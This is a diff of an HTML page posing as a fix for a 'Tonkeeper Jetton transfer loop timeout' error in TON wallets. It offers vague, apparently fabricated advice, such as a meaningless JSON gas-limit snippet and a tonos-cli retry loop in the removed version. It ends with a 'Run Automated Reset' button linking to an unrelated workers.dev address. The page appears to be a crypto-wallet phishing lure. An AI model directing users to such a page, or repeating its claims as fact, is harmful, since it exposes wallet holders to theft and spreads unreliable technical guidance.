@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,32 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and potential losses.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and frustration.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper Jetton transfer loop, which can be caused by network congestion, high gas fees, or issues with the Tonkeeper smart contract.</li>
+<li>The error occurs due to a timeout in the transfer loop, which can be caused by network congestion, high gas fees, or incorrect configuration of the Tonkeeper wallet.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for the transaction to prioritize it in the network:</li>
-<li>Update the transaction settings to use a higher gas price</li>
-<li>Use a custom transaction sender to manually set the gas limit</li>
-<li>Implement a retry mechanism using the following code:</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Increase the gas limit to prioritize the transaction</li>
+<li>Reduce the transaction amount to decrease the load on the network</li>
+<li>Update the Tonkeeper wallet to the latest version to ensure compatibility with the TON ecosystem</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="k">while</span><span class="w"> </span>!<span class="w"> </span>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="nv">$ADDR</span><span class="w"> </span>sendJettons<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--input<span class="w"> </span><span class="s2">&quot;{\&quot;dest\&quot;:\&quot;</span><span class="nv">$DEST</span><span class="s2">\&quot;,\&quot;amount\&quot;:\&quot;</span><span class="nv">$AMOUNT</span><span class="s2">\&quot;}&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--abi<span class="w"> </span>JettonWallet.abi.json<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>sleep<span class="w"> </span><span class="m">1</span>
-<span class="k">done</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;gas_limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced debugging and transaction management. </p>
+<p>Consider utilizing an external console to execute these commands for a more streamlined experience.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonos-cli installed and configured on the system</li>
-<li>Jetton Wallet ABI file (JettonWallet.abi.json) available</li>
-<li>Sufficient funds and jettons in the wallet for the transaction</li>
+<li>Tonkeeper wallet installed and configured</li>
+<li>Sufficient balance of TON coins for gas fees</li>
+<li>Stable internet connection for seamless transactions</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
